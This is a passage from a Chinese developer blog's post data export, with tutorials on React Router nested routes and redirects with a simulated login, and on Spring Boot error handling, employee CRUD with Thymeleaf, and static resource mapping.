不再是一个固定值，而是类似如下的格式： 1234let match = useRouteMatch()&lt;Route path=&#123;`$&#123;match.path&#125;/:userId`&#125;&gt; &lt;User /&gt;&lt;/Route&gt; 在 js 中 “`” 代表的是模板字符串，也就是说这里的 path 是 match.path 的值拼接上 /:userId。match 是什么现在先不管，这里 /:userId 就是一个 URL 参数。因此在这个 &lt;Route&gt; 标签内包裹的 &lt;User /&gt; 组件便可以通过 useParams() 这个 hook 获取 userId 的值： 1let &#123; userId &#125; = useParams(); 嵌套路由 在应用中 URL 肯定不止同一层级，例如可能会有一个管理用户的界面是 /Users，当需要查看或修改某一个用户时，界面可能是 /Users/&#123;userId&#125;。React Router很好的支持了嵌套路由。在之前的例子中，我们使用 1let match = useRouteMatch() 获取了一个 match 对象，match对象有两个很重要的属性 path 和 url。这两个属性告诉了我们当前组件的路径是什么。例如之前的例子，主 router 存在于 AppRouter 组件中，User 组件嵌套在 AppRouter 组件的一个 route 里，地址为 /Users。因此在 User 组件中我们使用 useRouteMatch() hook 获取 match 时，match 对象内的值为： 因此在编写 User 组件内部的 route 时，我们只需要取出 match 中的 path，然后拼接上下一步的路径即可： 1&lt;Route path=&#123;`$&#123;match.path&#125;/:userId`&#125;&gt; 那么 path 和 url 有什么区别呢？在路径中全部为静态路径并且没有匹配规则时，两者的值是相同的。但是一旦包含变量或者匹配规则，url 显示的是现在具体的路径，而 path 包含的则当前的路径匹配规则。我们还是通过上面的例子来解释。在 Users 组件路由到 User 组件时，我们是这样写的： 123&lt;Route path=&#123;`$&#123;match.path&#125;/:userId`&#125;&gt; &lt;User /&gt;&lt;/Route&gt; 现在我们修改 User，让其在终端输出 match 的值: 1234567const User = () =&gt; &#123; // 通过 Hook 获取 路径变量 let &#123; userId &#125; = useParams(); let match = useRouteMatch(); console.log(match) return &lt;h3&gt;User name: &#123;userId&#125;&lt;/h3&gt;&#125; 可以看到 url 的值是具体的 &quot;/Users/Alice&quot;，而 path 的值则是 &quot;/Users/:userId&quot;。 重定向 Web应用中重定向是一个很常见的操作，例如登录完成后跳转到首页，又或是未登录时自动跳转到登录页。在 react router 中有多种方式可以实现重定向。 通过渲染 redirect 组件 通过 history 我们通过例子来学习这两种方法，我们模拟一下登录认证的过程。在 component 下创建一个新的 AuthExample.js。首先我们引入需要的包： 12345678910import React from &quot;react&quot;;import &#123; BrowserRouter as Router, Switch, Route, Link, Redirect, useHistory, useLocation&#125; from &quot;react-router-dom&quot;; 我们模拟的情况是一个网站中存在公共页面，也就是无需登录就可以访问的页面，同时还有私有页面，也就是必须登录才能访问的页面。如果在未登录的情况下访问私有页面，则会自动跳转到登录页。首先我们先编写一个模拟的认证功能： 123456789101112const fakeAuth = &#123; isAuthenticated: false, // cb 为认证完成后的回调函数 authenticate(cb) &#123; fakeAuth.isAuthenticated = true; setTimeout(cb, 100); // fake async &#125;, signout(cb) &#123; fakeAuth.isAuthenticated = false; setTimeout(cb, 100); &#125;&#125;; 接着我们编写页面的大概结构： 1234567891011121314151617181920212223242526272829const AuthExample = () =&gt; &#123; return ( &lt;Router&gt; &lt;div&gt; &lt;ul&gt; &lt;li&gt; &lt;Link to=&quot;/public&quot;&gt;Public Page&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=&quot;/protected&quot;&gt;Protected Page&lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; &lt;Switch&gt; &lt;Route path=&quot;/public&quot;&gt; &lt;PublicPage /&gt; &lt;/Route&gt; &lt;Route path=&quot;/login&quot;&gt; &lt;LoginPage /&gt; &lt;/Route&gt; &#123;/*一个对&lt;Route&gt;组件的包装，见后文*/&#125; &lt;PrivateRoute path=&quot;/protected&quot;&gt; &lt;ProtectedPage /&gt; &lt;/PrivateRoute&gt; &lt;/Switch&gt; &lt;/div&gt; &lt;/Router&gt; );&#125; 你可能发现了 PrivateRoute 这个组件，他是我们对于普通 Route 组件的封装，其中包含了判断是否登录的逻辑： 12345678910111213141516171819202122232425const PrivateRoute = (&#123; children, ...rest &#125;) =&gt; &#123; // Route 的 render 属性需要传入一个函数返回需要render的内容 // 会自动传入 location 变量，即用户现在所在的路径 const handleRender = (&#123;location&#125;) =&gt; &#123; if(fakeAuth.isAuthenticated)&#123; // 如果登录了就渲染 childre return children &#125;else&#123; // 第一种方式：如果未登录就渲染 &lt;Redirect&gt; 进行重定向 return (&lt;Redirect to=&#123;&#123; // 把现在的位置放到 /login 的state中，方便登陆完成后跳转回来 pathname: &quot;/login&quot;, state: &#123; from: location &#125; &#125;&#125; /&gt;) &#125; &#125; return ( &lt;Route &#123;...rest&#125; render=&#123;handleRender&#125; /&gt; );&#125; 接下来则是我们的公共页，私有页和登录页： 12345678910111213141516171819202122232425262728function PublicPage() &#123; return &lt;h3&gt;Public&lt;/h3&gt;;&#125;function ProtectedPage() &#123; return &lt;h3&gt;Protected&lt;/h3&gt;;&#125;function LoginPage() &#123; let history = useHistory(); let location = useLocation(); // 判断当前 /login 的 state 中是否有 from，如果没有就设置为 &quot;/&quot; let &#123; from &#125; = location.state || &#123; from: &#123; pathname: &quot;/&quot; &#125; &#125;; let login = () =&gt; &#123; fakeAuth.authenticate(() =&gt; &#123; // 通过History进行跳转到from的页面 history.replace(from); &#125;); &#125;; return ( &lt;div&gt; &lt;p&gt;You must log in to view the page at &#123;from.pathname&#125;&lt;/p&gt; &lt;button onClick=&#123;login&#125;&gt;Log in&lt;/button&gt; &lt;/div&gt; );&#125; 运行项目，你会发现点击 Protected Page 会自动跳转到登录页面，点击登录按钮后，又会自动跳转回 Protected Page. 页面不存在 如果用户访问不存在的路径，我们可以通过 Route 的匹配规则来捕捉所有不存在的路径： 123&lt;Route path=&quot;*&quot;&gt; &lt;NoMatch /&gt;&lt;/Route&gt;","categories":[{"name":"找工作","slug":"找工作","permalink":"https://virgilchen97.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"React","slug":"React","permalink":"https://virgilchen97.github.io/tags/React/"}]},{"title":"SpringBoot-Web开发（三）","slug":"SpringBoot-Web开发（三）","date":"2020-06-22T15:32:09.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/06/SpringBoot-Web开发（三）/","link":"","permalink":"https://virgilchen97.github.io/2020/06/SpringBoot-Web%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%89%EF%BC%89/","excerpt":"第三部分我们学习Spring Boot的错误处理机制，以及我们如何自定义错误数据 错误处理 为了方便测试，我们先关闭拦截器，注释掉相应代码。如果此时访问一个项目中不存在的地址，我们会得到一个默认的错误页面：","text":"第三部分我们学习Spring Boot的错误处理机制，以及我们如何自定义错误数据 错误处理 为了方便测试，我们先关闭拦截器，注释掉相应代码。如果此时访问一个项目中不存在的地址，我们会得到一个默认的错误页面： 如果此时我们使用Postman向服务器像一个不存在的地址发送请求，我们会得到一个json数据： SpringBoot 会根据请求头中的 Accept: 属性来决定做出哪种请求相应。SpringBoot是如何实现的呢？我们查看 ErrorMvcAutoConfiguration 自动配置类发现，SpringBoot自动为我们配置了以下几个组件： ErrorPageCustomizer：当服务器发生错误时，重定向到错误请求 (/error) BasicErrorController：处理错误请求的Controller，读取请求头的 Accept: 决定调用的方法类型 DefaultErrorViewResolver： BasicErrorController 会通过 ErrorViewResolver接口来找到需要返回的视图，DefaultErrorViewResolver 就是Spring默认的实现。该实现会首先尝试模板引擎是否有适用于错误的 View，如果没有则会去静态资源目录找静态资源，如果都没有则返回null DefaultErrorAttributes：当使用模板引擎的时候，我们可以获取错误相关的参数，而 ErrorAttributes 接口则定义了获取错误参数的行为，DefaultErrorAttributes 就是SpringBoot的默认是实现，其中我们可以获取到的参数有： timestamp：时间戳 status：状态码 error：错误提示 exception：异常对象 message：异常消息 errors：JSR303数据校验错误 对原理有了一定了解后，我们就知道如何定制我们的错误页面了。对于定制 HTML 错误页面，我们只需要讲错误页面的模板放在模板文件的 error/ 目录下，就会自动调用。例如如果发生了404错误，那么Spring就会去找 error/404.html 这个模板，对于其他错误，Spring都会寻找 error/&#123;错误状态码&#125;.html。你也可以通过 4xx.html 来响应所有的 4xx 错误。现在尝试在 templates 文件夹中创建 error 文件夹，把 404.html 移动到 error，修改404.html，尝试取出错误参数： 12345&lt;main role=&quot;main&quot; class=&quot;col-md-9 ml-sm-auto col-lg-10 pt-3 px-4&quot;&gt; &lt;h1&gt;status: [[$&#123;status&#125;]]&lt;/h1&gt; &lt;h2&gt;Timestamp: [[$&#123;timestamp&#125;]]&lt;/h2&gt; &lt;p&gt;Error: [[$&#123;error&#125;]]&lt;/p&gt;&lt;/main&gt; 此时再次访问不存在的地址： 已经变成了我们定制的错误页面。现在我们完成了错误页面的定制，那么我们如何实现错误数据的定制呢？首先我们需要为指定的错误创建对应的Exception。假设我们现在有一个请求是查找员工，地址是 /employee/&#123;id&#125;，当查询一个不存在的员工时，我们希望返回 404 错误，并且提示 “用户未找到”。那么首先我们创建一个Exception包，在里面创建 EmployeeNotFoundException 类： 我们之前提到的组件 DefaultErrorAttributes 包含了错误数据的格式，那么我们自己也可以实现一个 ErrorAttributes 并加入容器来实现错误数据的定制。在 component 包下创建","categories":[{"name":"找工作","slug":"找工作","permalink":"https://virgilchen97.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"https://virgilchen97.github.io/tags/Spring/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://virgilchen97.github.io/tags/SpringBoot/"}]},{"title":"SpringBoot-Web开发（二）","slug":"SpringBoot-Web开发（二）","date":"2020-06-18T15:31:51.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/06/SpringBoot-Web开发（二）/","link":"","permalink":"https://virgilchen97.github.io/2020/06/SpringBoot-Web%E5%BC%80%E5%8F%91%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"第二部分我们来实现员工的CRUD： REST API 为系统设计一下 RESTful API： 功能 URI 请求方式 查询所有员工 /employees GET 查询一个员工 /empoyee/{id} GET 添加员工 /employee POST 修改员工 /employee PUT 删除员工 /employee/{id} DELETE","text":"第二部分我们来实现员工的CRUD： REST API 为系统设计一下 RESTful API： 功能 URI 请求方式 查询所有员工 /employees GET 查询一个员工 /empoyee/{id} GET 添加员工 /employee POST 修改员工 /employee PUT 删除员工 /employee/{id} DELETE 来到 dashboard 页面，我们希望在点击 customer 这个链接时跳转到员工列表，并可以对员工进行增删查改 修改 dashboard.html, 修改customer按钮的链接以及文本，注意要使用模板引擎： 1234&lt;a class=&quot;nav-link&quot; href=&quot;#&quot; th:href=&quot;@&#123;/employee&#125;&quot;&gt; ... Employees&lt;/a&gt; Themyleaf 公共元素提取 同时我们注意到员工页面和dashboard页面其实侧边栏和顶栏使用的都是相同的元素，通过观察我们发现在dashboard页面，侧边栏的所有DOM在: 1&lt;nav class=&quot;col-md-2 d-none d-md-block bg-light sidebar&quot;&gt; 这个标签下，因此我们我们可以通过thymeleaf提取这个公共组件，再插入到dashboard页面中去，这样我们就不需要在list页面把侧边栏和顶栏的html都复制一遍了，我们可以通过添加 id 或是通过添加 th:fragment 这两个属性来标注一个公共元素： 123&lt;nav class=&quot;col-md-2 d-none d-md-block bg-light sidebar&quot; id=&quot;sidebar&quot;&gt;&lt;!--or--&gt;&lt;nav class=&quot;col-md-2 d-none d-md-block bg-light sidebar&quot; th:fragment=&quot;sidebar&quot;&gt; 这样我们就可以去 list.html，讲list.html文件中重复的侧边栏DOM替换为： 12&lt;div th:replace=&quot;dashboard :: #sidebar&quot;&gt; &lt;!--使用css选择器--&gt;&lt;div th:replace=&quot;dashboard :: sidebar&quot;&gt; &lt;!--使用fragment标注--&gt; 完成后，为了测试效果，我们编写一个简单的 EmployeeController： 1234567@Controllerpublic class EmployeeController &#123; @GetMapping(&quot;/employee&quot;) public String list(Model model)&#123; return &quot;list&quot;; &#125;&#125; 试着访问list页面，发现侧边栏依然可以正常显示。因此我们可以吧这些通用的HTML组件提取出来。在 templates 下新建 commons 文件夹，创建 bar.html，把我们之前标注的sidebar部分的HTML剪切过来。同时我们对于顶栏也可以做相同的操作： 然后在dashboard和list页面使用 th:replace 来注入top bar和side bar： 1&lt;div th:replace=&quot;commons/bar :: sidebar&quot;/&gt; 但是仍然有一个问题，就是即使我们现在处于Employee页面，侧边栏高亮的仍然是 Dashboard。这里我们需要用到themyleaf的参数化片段。观察高亮的按钮，我们发现其实是标签的class多了一个 active: 1234&lt;a class=&quot;nav-link active&quot; href=&quot;#&quot; th:href=&quot;@&#123;/main&#125;&quot;&gt; ... Dashboard &lt;/a&gt; 我们可以在此处添加一个判断，通过判断 activeUri 来决定是否要在class中加入 active： 123456789&lt;a class=&quot;nav-link active&quot; href=&quot;#&quot; th:class=&quot;$&#123;activeUri == &#x27;main&#x27; ? &#x27;nav-link active&#x27; : &#x27;nav-link&#x27;&#125;&quot; th:href=&quot;@&#123;/main&#125;&quot;&gt; ... Dashboard &lt;/a&gt;...&lt;a class=&quot;nav-link active&quot; href=&quot;#&quot; th:class=&quot;$&#123;activeUri == &#x27;employee&#x27; ? &#x27;nav-link active&#x27; : &#x27;nav-link&#x27;&#125;&quot; th:href=&quot;@&#123;/employee&#125;&quot;&gt; ... Employee&lt;/a&gt; 那么这个 activeUri 的变量从哪里来呢？这是我们就要修改dashboard和list这两个页面中引用这段HTML的地方，传入 activeUri： 1234&lt;!--dashboard--&gt;&lt;div th:replace=&quot;commons/bar :: sidebar(activeUri=&#x27;main&#x27;)&quot;/&gt;&lt;!--dashboard--&gt;&lt;div th:replace=&quot;commons/bar :: sidebar(activeUri=&#x27;employee&#x27;)&quot;/&gt; 此时侧边栏就可以根据页面切换高亮了。 填充员工数据 接下来我们为员工创建实体类和相对应的Repository，不记得如何编写的可以参考之前数据访问的笔记。在数据库中插入一些假数据。然后编写 EmployeeController： 12345678910111213@Controllerpublic class EmployeeController &#123; @Autowired EmployeeRepository employeeRepository; @GetMapping(&quot;/employee&quot;) public String list(Model model)&#123; List&lt;Employee&gt; employees= employeeRepository.findAll(); model.addAttribute(&quot;employees&quot;, employees); return &quot;list&quot;; &#125;&#125; 接下来修改 list 页面的表格部分，使用模板引擎进行替换： 123456789101112131415161718192021222324&lt;div class=&quot;table-responsive&quot;&gt; &lt;table class=&quot;table table-striped table-sm&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;#&lt;/th&gt; &lt;th&gt;LastName&lt;/th&gt; &lt;th&gt;Email&lt;/th&gt; &lt;th&gt;Gender&lt;/th&gt; &lt;th&gt;Department Id&lt;/th&gt; &lt;th&gt;Birth&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr th:each=&quot;employee:$&#123;employees&#125;&quot;&gt; &lt;td th:text=&quot;$&#123;employee.id&#125;&quot;/&gt; &lt;td th:text=&quot;$&#123;employee.lastName&#125;&quot;/&gt; &lt;td th:text=&quot;$&#123;employee.email&#125;&quot;/&gt; &lt;td th:text=&quot;$&#123;employee.gender&#125; == 0 ? &#x27;Male&#x27; : &#x27;Female&#x27;&quot;/&gt; &lt;td th:text=&quot;$&#123;employee.departmentId&#125;&quot;/&gt; &lt;td th:text=&quot;$&#123;#dates.format(employee.birth, &#x27;dd/MM/yyyy&#x27;)&#125;&quot;/&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt;&lt;/div&gt; 现在访问员工管理页面，发现所有员工的数据已经正常展示出来了： 员工添加 现在已经可以列出所有员工，现在我们添加增加员工的功能。首先在list界面添加相关的按钮以及他们对应的操作地址，添加员工页面的地址我们定为 GET /addEmployee : 12345&lt;main role=&quot;main&quot; class=&quot;col-md-9 ml-sm-auto col-lg-10 pt-3 px-4&quot;&gt; &lt;!-- 添加按钮 --&gt; &lt;a class=&quot;btn btn-sm btn-primary&quot; href=&quot;/addEmployee&quot; th:href=&quot;@&#123;/addEmployee&#125;&quot;&gt;Add&lt;/a&gt; ...&lt;/main&gt; 界面大概会变成这样： 然后在 EmployeeController 中添加方法： 12345678910111213141516// 返回添加员工页面@GetMapping(&quot;/addEmployee&quot;)public String toAddPage(Model model)&#123; // 添加员工页面需要选择部门，因此把所有部门查找出来放入model List&lt;Department&gt; departments = departmentRepository.findAll(); model.addAttribute(&quot;departments&quot;, departments); return &quot;add&quot;;&#125;@PostMapping(&quot;/employee&quot;)// Spring 会自动把收到的参数parse到Employee对象中public String addEmployee(Employee employee)&#123; employeeRepository.save(employee); // 重定向到员工列表 return &quot;redirect:/employee&quot;;&#125; 接下来我们需要增加一个添加员工的模板，把 list.html 复制一份，删除main标签内的所有内容，编写一个和 Employee 类对应的表单，注意所有 &lt;input&gt; 标签一定要有 name 属性，该属性的值为 Employee 对象内对应的属性名： 12345678910111213141516171819202122232425262728293031323334353637&lt;form th:action=&quot;@&#123;/employee&#125;&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;lastname&quot;&gt;Last Name&lt;/label&gt; &lt;!--Employee对象中属性名为lastName，因此name就是lastName--&gt; &lt;input name=&quot;lastName&quot; type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;lastname&quot; placeholder=&quot;Bob&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;email&quot;&gt;Email&lt;/label&gt; &lt;input name=&quot;email&quot; type=&quot;email&quot; class=&quot;form-control&quot; id=&quot;email&quot; placeholder=&quot;name@example.com&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;gender&quot;&gt;Gender&lt;/label&gt; &lt;div id=&quot;gender&quot; &gt; &lt;div class=&quot;form-check form-check-inline&quot;&gt; &lt;input class=&quot;form-check-input&quot; type=&quot;radio&quot; name=&quot;gender&quot; id=&quot;inlineRadio1&quot; value=&quot;0&quot;&gt; &lt;label class=&quot;form-check-label&quot; for=&quot;inlineRadio1&quot;&gt;Male&lt;/label&gt; &lt;/div&gt; &lt;div class=&quot;form-check form-check-inline&quot;&gt; &lt;input class=&quot;form-check-input&quot; type=&quot;radio&quot; name=&quot;gender&quot; id=&quot;inlineRadio2&quot; value=&quot;1&quot;&gt; &lt;label class=&quot;form-check-label&quot; for=&quot;inlineRadio2&quot;&gt;Female&lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;department&quot;&gt;Department&lt;/label&gt; &lt;select multiple class=&quot;form-control&quot; id=&quot;department&quot; name=&quot;departmentId&quot;&gt; &lt;!--取出model中的Department，循环创建对应option--&gt; &lt;!--提交到数据库中的为DepartmentId，因此value=&quot;$&#123;department.id&#125;&quot;--&gt; &lt;option th:each=&quot;department:$&#123;departments&#125;&quot; th:text=&quot;$&#123;department.departmentName&#125;&quot; th:value=&quot;$&#123;department.id&#125;&quot;&gt;&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;birth&quot;&gt;Birth&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;birth&quot; class=&quot;form-control&quot; id=&quot;birth&quot; placeholder=&quot;2000-01-01&quot;&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Submit&lt;/button&gt;&lt;/form&gt; 完成后，点击添加按钮，我们可以来到添加员工的页面： 填入相关信息（注意日期格式为 yyyy/MM/dd），点击 Submit 按钮，我们自动跳转到了员工列表页面，并且新的员工也出现在了列表中： 员工修改 我们可以在重用添加员工页面，不同的是如果是员工修改，那么表单中应该显示该员工原本的数据。首先为员工修改编写 controller: 12345678910111213141516171819// 转到员工修改页面@GetMapping(&quot;/employee/&#123;id&#125;&quot;)public String toEditPage(@PathVariable Integer id, Model model)&#123; // 查找出员工和所有的部门 Employee employee = employeeRepository.findById(id).get(); model.addAttribute(&quot;employee&quot;, employee); List&lt;Department&gt; departments = departmentRepository.findAll(); model.addAttribute(&quot;departments&quot;, departments); // 重用 Add 页面 return &quot;add&quot;;&#125;@PutMapping(&quot;/employee/&#123;id&#125;&quot;)public String editEmployee(@PathVariable Integer id, Employee employee, Model model)&#123; // 因为是修改，我们需要把Path中的id添加到员工对象中 employee.setId(id); employeeRepository.save(employee); return &quot;redirect:/employee&quot;;&#125; 然后则是要对 add 页面进行修改，让他兼容员工修改的功能： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!-- 判断页面中是否有employee这个key，从而实现不同的请求路径 --&gt;&lt;form th:action=&quot;$&#123;employee != null&#125; ? @&#123;/employee/&#125; + $&#123;employee.id&#125; : @&#123;/employee&#125;&quot; method=&quot;post&quot;&gt; &lt;!-- HTML 表单不支持PUT请求，Spring通过添加下方的标签来实现解析PUT请求 --&gt; &lt;input type=&quot;hidden&quot; name=&quot;_method&quot; value=&quot;put&quot; th:if=&quot;$&#123;employee!=null&#125;&quot;/&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;lastname&quot;&gt;Last Name&lt;/label&gt; &lt;!-- 设置value为employee的值，所有操作都要事先判断是否为空 --&gt; &lt;input name=&quot;lastName&quot; type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;lastname&quot; placeholder=&quot;Bob&quot; th:value=&quot;$&#123;employee!=null&#125; ? $&#123;employee.lastName&#125;&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;email&quot;&gt;Email&lt;/label&gt; &lt;input name=&quot;email&quot; type=&quot;email&quot; class=&quot;form-control&quot; id=&quot;email&quot; placeholder=&quot;name@example.com&quot; th:value=&quot;$&#123;employee!=null&#125; ? $&#123;employee.email&#125;&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;gender&quot;&gt;Gender&lt;/label&gt; &lt;div id=&quot;gender&quot; &gt; &lt;div class=&quot;form-check form-check-inline&quot;&gt; &lt;input class=&quot;form-check-input&quot; type=&quot;radio&quot; name=&quot;gender&quot; id=&quot;inlineRadio1&quot; value=&quot;0&quot; th:checked=&quot;$&#123;employee!=null&#125; ? $&#123;employee.gender == 0&#125;&quot;&gt; &lt;label class=&quot;form-check-label&quot; for=&quot;inlineRadio1&quot;&gt;Male&lt;/label&gt; &lt;/div&gt; &lt;div class=&quot;form-check form-check-inline&quot;&gt; &lt;input class=&quot;form-check-input&quot; type=&quot;radio&quot; name=&quot;gender&quot; id=&quot;inlineRadio2&quot; value=&quot;1&quot; th:checked=&quot;$&#123;employee!=null&#125; ? $&#123;employee.gender == 1&#125;&quot;&gt; &lt;label class=&quot;form-check-label&quot; for=&quot;inlineRadio2&quot;&gt;Female&lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;department&quot;&gt;Department&lt;/label&gt; &lt;select multiple class=&quot;form-control&quot; id=&quot;department&quot; name=&quot;departmentId&quot;&gt; &lt;option th:each=&quot;department:$&#123;departments&#125;&quot; th:text=&quot;$&#123;department.departmentName&#125;&quot; th:value=&quot;$&#123;department.id&#125;&quot; th:selected=&quot;$&#123;employee!=null&#125; ? $&#123;employee.departmentId == department.id&#125;&quot; &gt;&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;birth&quot;&gt;Birth&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;birth&quot; class=&quot;form-control&quot; id=&quot;birth&quot; placeholder=&quot;2000/01/01&quot; th:value=&quot;$&#123;employee!=null&#125; ? $&#123;#dates.format(employee.birth, &#x27;yyyy/MM/dd&#x27;)&#125;&quot;&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Submit&lt;/button&gt;&lt;/form&gt; 接下来我们要修改Spring Boot的配置文件，启用从 hidden 的input标签解析请求方式的功能： 12345spring: mvc: hiddenmethod: filter: enabled: true 大功告成，现在点击员工旁的edit按钮，可以看到来到了add页面，而且输入框中预先填写了员工的当前数据： 修改这个员工的邮箱为 frank@test.com.cn 点击提交，可以看到回到了员工列表页面，并且员工的信息已经显示为修改后的值： 员工删除 第一步仍然是编写 Controller： 12345@DeleteMapping(&quot;/employee/&#123;id&#125;&quot;)public String deleteEmployee(@PathVariable Integer id)&#123; employeeRepository.deleteById(id); return &quot;redirect:/employee&quot;;&#125; 然后修改页面的删除按钮，为了避免一个按钮一个表单的臃肿，我们将表单和按钮分开，给按钮添加监听并用JavaScript来提交表单，首先修改删除按钮： 12&lt;!-- 使用th:attr添加了一个员工id的参数，用于区分是哪个按钮被点击了，同时在class中添加del-btn --&gt;&lt;button type=&quot;submit&quot; class=&quot;btn btn-sm btn-danger del-btn&quot; th:attr=&quot;employee-id=$&#123;employee.id&#125;&quot;&gt;Delete&lt;/button&gt; 然后在 &lt;main&gt; 标签外添加一个 form： 123&lt;form method=&quot;post&quot; id=&quot;del-form&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;_method&quot; value=&quot;delete&quot;&gt;&lt;/form&gt; 然后在 &lt;body&gt; 标签下添加脚本： 12345678910&lt;script&gt; // 旧版本写法 $(&quot;.del-btn&quot;).click(function()&#123; $(&quot;#del-form&quot;).attr(&quot;action&quot;, &quot;/employee/&quot; + $(this).attr(&quot;employee-id&quot;)).submit(); &#125;) // ES6 写法 $(&quot;.del-btn&quot;).click((event)=&gt;&#123; $(&quot;#del-form&quot;).attr(&quot;action&quot;, &quot;/employee/&quot; + $(event.target).attr(&quot;employee-id&quot;)).submit(); &#125;)&lt;/script&gt; 完成后重新启动项目，点击删除按钮，可以发现员工成功的被删除了。","categories":[{"name":"找工作","slug":"找工作","permalink":"https://virgilchen97.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"Spring","slug":"Spring","permalink":"https://virgilchen97.github.io/tags/Spring/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://virgilchen97.github.io/tags/SpringBoot/"}]},{"title":"SpringBoot Web 开发（一）","slug":"SpringBoot-Web开发","date":"2020-06-16T05:03:37.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2020/06/SpringBoot-Web开发/","link":"","permalink":"https://virgilchen97.github.io/2020/06/SpringBoot-Web%E5%BC%80%E5%8F%91/","excerpt":"在写这篇笔记之前我也有很多思考，我参考的教程中有很多SpringMVC以及JSP，模板引擎的内容。貌似现在的开发大环境下，后端需要兼顾手机App和网页版共同的请求，前后端分离是大的趋势。但是我仍然准备学习一下传统的服务器端渲染的相关技术。一方面是感受一下技术的演进，另一方面是前后端分离不利于SEO（Serach Engine Optimization），很多现有的产品仍然使用服务器渲染的原因就是搜索引擎。虽然现在可能会有一些更加成熟的方案（nodejs作为中间层），但是咱们还是一步一步来。第一部分我们熟悉模板引擎，静态资源映射，并实现简单的登录功能。","text":"在写这篇笔记之前我也有很多思考，我参考的教程中有很多SpringMVC以及JSP，模板引擎的内容。貌似现在的开发大环境下，后端需要兼顾手机App和网页版共同的请求，前后端分离是大的趋势。但是我仍然准备学习一下传统的服务器端渲染的相关技术。一方面是感受一下技术的演进，另一方面是前后端分离不利于SEO（Serach Engine Optimization），很多现有的产品仍然使用服务器渲染的原因就是搜索引擎。虽然现在可能会有一些更加成熟的方案（nodejs作为中间层），但是咱们还是一步一步来。第一部分我们熟悉模板引擎，静态资源映射，并实现简单的登录功能。 Spring Boot 静态资源映射 在以往的SpringMVC中，我们会将静态资源文件储存在WEBAPP中，但是在SpringBoot中则有所不同。开始前使用 Spring Initializer 新建一个 restful-api 的项目。勾选 web, Spring Data JPA, MySQL 模块. 1. /webjars/**: jar包形式存在的静态资源 所有对于 /webjars/** 的访问都会去 classpath:/META-INF/resources/webjars/ 下去找相应的资源。你可以通过 webjars 网站获取相应webjar的maven依赖，例如 jQuery 的依赖如下： 123456&lt;!--引入Jquery--&gt;&lt;dependency&gt; &lt;groupId&gt;org.webjars&lt;/groupId&gt; &lt;artifactId&gt;jquery&lt;/artifactId&gt; &lt;version&gt;3.5.1&lt;/version&gt;&lt;/dependency&gt; 你同样可以找到其他流行的web框架例如 Bootstrap, react 的webjar。作为测试我们吧 jQuery 的依赖添加到我们的项目中。在Idea的External Libraries中我们可以看到 jQuery 的 webjar 结构如下： 所以如果此时我们启动项目，直接在浏览器访问 localhost:8080/webjars/jquery/3.5.1/jquery.js 我们便可以获取 jquery.js 这个文件的内容： 2. /** 静态资源文件夹 所有对于 /** 路径的访问，如果没有被 @RequestMapping 绑定，那么SpringBoot会默认从一下文件夹获取： 12345&quot;classpath:/META-INF/resources&quot;&quot;classpath:/resources&quot; //注意这个不是我们创建工程中已经存在的resources，工程中已存在的resource实际是根目录&quot;classpath:/static&quot;&quot;classpath:/public&quot;&quot;/&quot; 例如我们现在在 resource/static 文件夹下创建一个test.html: 内容为： 1&lt;h1&gt;Hello&lt;/h1&gt; 此时我们访问 localhost:8080/test.html ： 可以看到资源成功访问，载入了test.html页面。 3. 欢迎页映射：index.html 如果我们直接访问 localhost:8080/，那么 SpringBoot 就会去每个资源文件夹下寻找index.html并返回，把刚才我们创建的 HTML 文件改名为 index.html，在浏览器中访问 localhost:8080/ ，可以发现页面依然成功载入了。 4. favicon 定义网页图标，所有静态资源文件夹下的favicon.ico SpringBoot 模板引擎 JSP, velocity, Thymeleaf都是模板引擎。他们可以讲模板与数据结合，并生成最终的页面。SpringBoot 推荐的模板引擎时Thymeleaf。修改 pom.xml 引入 thymeleaf： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; 